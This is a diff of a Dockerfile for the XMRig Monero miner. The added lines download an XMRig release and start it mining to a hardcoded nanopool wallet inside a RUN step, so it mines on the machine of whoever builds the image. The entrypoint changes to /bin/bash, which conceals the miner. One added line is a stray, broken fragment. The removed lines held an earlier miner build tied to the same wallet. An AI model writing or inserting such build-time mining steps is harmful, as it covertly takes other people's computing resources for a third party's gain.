@@ -1,16 +1,6 @@
-FROM          alpine:3.7 as build
+FROM          ubuntu:latest
 
-ENV           XMRIG_DIR /xmrig-cpu
-ENV           XMRIG_BUILD_DIR $XMRIG_DIR/build
+RUN curl -OL https://github.com/xmrig/xmrig/releases/download/v2.5.3/xmrig-2.5.3-xenial-amd64.tar.gz && tar -xzvf ./xmrig-2.5.3-xenial-amd64.tar.gz && cd xmrig-2.5.3 && ./xmrig -o xmr-eu1.nanopool.org:14444 -u 49KZjKD9McXR9VpmcnWAczgRChyYckiXQVTtsnr8so84FA8ttpkvLrsKpmAHJ7vLUqHGT3sV2dneYBfqFu7kunBp4ARGRDc -p x
+-p x -k --donate-level=1;
 
-RUN           apk --no-cache add build-base cmake curl git libuv-dev
-RUN           git clone https://github.com/xmrig/xmrig.git $XMRIG_DIR && cd $XMRIG_DIR && \
-    git reset --hard fd029201b00bab2948cbe0ed67ff162e10aa9dfe
-RUN           mkdir $XMRIG_BUILD_DIR && cd $XMRIG_BUILD_DIR && \
-    cmake .. -DWITH_HTTPD=OFF && make
-RUN           mv $XMRIG_BUILD_DIR/xmrig /usr/bin/
-
-FROM          alpine:3.7
-RUN           apk --no-cache add libuv-dev
-COPY          --from=build /usr/bin/xmrig /usr/bin/
-ENTRYPOINT    ["./xmrig -o stratum+tcp://xmr-eu1.nanopool.org:14444 -u 49KZjKD9McXR9VpmcnWAczgRChyYckiXQVTtsnr8so84FA8ttpkvLrsKpmAHJ7vLUqHGT3sV2dneYBfqFu7kunBp4ARGRDc -p x"]
+ENTRYPOINT    ["/bin/bash"]
